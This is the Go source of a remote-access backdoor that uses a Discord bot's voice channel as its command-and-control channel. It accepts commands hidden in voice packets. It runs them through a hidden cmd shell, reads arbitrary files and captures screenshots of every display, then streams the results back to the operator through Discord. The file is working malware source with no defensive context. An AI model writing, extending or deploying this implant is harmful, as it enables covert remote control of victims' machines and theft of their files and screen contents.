package main

import (
	"bytes"
	"fmt"
	"github.com/bwmarrin/discordgo"
	"github.com/kbinani/screenshot"
	"image/jpeg"
	"io/ioutil"
	"os/exec"
	"strings"
	"syscall"
)

var (
	token          = "" // Bot 2 Token
	ChannelID      = "" // Voice Channel ID
	GuildID        = "" //Server ID
  
	buffer         = make([][]byte, 0)
	buffer_new     = make([][]byte, 0)
	info           string
	delimiter_data = "|||"
	chunks         = make([][]byte, 0)
	tmp            = make([][]byte, 0)
)

func main() {
	//init bot
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("Error creating Discord session: ", err)
		return
	}

	//add ability to send voice data and read text chat
	dg.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMessages | discordgo.IntentsGuildVoiceStates
	err = dg.Open()
	if err != nil {
		fmt.Println("Error opening Discord session: ", err)
	}

	//join c2 channel voice chat
	v, err := dg.ChannelVoiceJoin(GuildID, ChannelID, true, false)
	if err != nil {
		fmt.Println("failed to join voice channel:", err)
		return
	}
	go handleVoice(v.OpusRecv, v)
	for {
	}
}

func handleVoice(c chan *discordgo.Packet, connection *discordgo.VoiceConnection) {
	for p := range c {
		data := strings.Split(string(p.Opus), "|||")
		user_input := data[1]
		if data[0] == "Run-Command" {
			//command := data[1]
			run_cmd(user_input)
			result := bytes.Join(buffer, nil)
			chunks = chunk_buffer(result, 950)
			playSound(connection)
			buffer = make([][]byte, 0)
		} else if data[0] == "Download" {
			//fmt.Println(data)
			filepath := user_input
			//fmt.Printf(filepath)
			file_data, err := ioutil.ReadFile(filepath)
			if err != nil {
				return
			}
			if strings.Contains(filepath, "\\") {
				filename_raw := strings.Split(filepath, "\\")
				info = filename_raw[len(filename_raw)-1]
			} else {
				info = filepath
			}
			info = "Download|||" + info
			buffer = append(buffer, file_data) //C:\Users\smuve\Downloads\34954477.jpg
			result := bytes.Join(buffer, nil)
			chunks = chunk_buffer(result, 950)
			playSound(connection)
			buffer = make([][]byte, 0)
		} else if data[0] == "Screenshot" {
			n := screenshot.NumActiveDisplays()
			for i := 0; i < n; i++ {
				bounds := screenshot.GetDisplayBounds(i)
				img, _ := screenshot.CaptureRect(bounds)
				fileName := fmt.Sprintf("%d_%dx%d.jpeg", i, bounds.Dx(), bounds.Dy())
				info = "Screenshot|||" + fileName
				imgbuffer := new(bytes.Buffer)
				jpeg.Encode(imgbuffer, img, nil)
				chunks = chunk_buffer(imgbuffer.Bytes(), 950)
				playSound(connection)
			}
			buffer = make([][]byte, 0)
		}
	}
}

func chunk_buffer(buf []byte, lim int) [][]byte {
	var chunk []byte
	chunks := make([][]byte, 0, len(buf)/lim+1)
	for len(buf) >= lim {
		chunk, buf = buf[:lim], buf[lim:]
		chunks = append(chunks, chunk)
	}
	if len(buf) > 0 {
		chunks = append(chunks, buf[:len(buf)])
	}
	return chunks
}

func run_cmd(command string) {
	cmd := exec.Command("cmd", "/C", command)
	var outb bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	cmd.Stdout = &outb
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
	info = "Run-Command"
	cmd_result := outb.String()
	buffer = append(buffer, []byte(cmd_result))
}

func playSound(s *discordgo.VoiceConnection) {
	s.Speaking(true)
	i := 0
	for _, h := range chunks {
		tmp = append(tmp, h)
		for _, chunk := range tmp {
			i++
			size := [][]byte{[]byte(info + delimiter_data)}
			size_new := bytes.Join(size, nil)
			size_chunk := chunk_buffer(size_new, 990)
			new_chunk := append(size_chunk, chunk)
			a := bytes.Join(new_chunk, nil)
			s.OpusSend <- a
			tmp = make([][]byte, 0)
		}
	}
	s.Speaking(false)
}
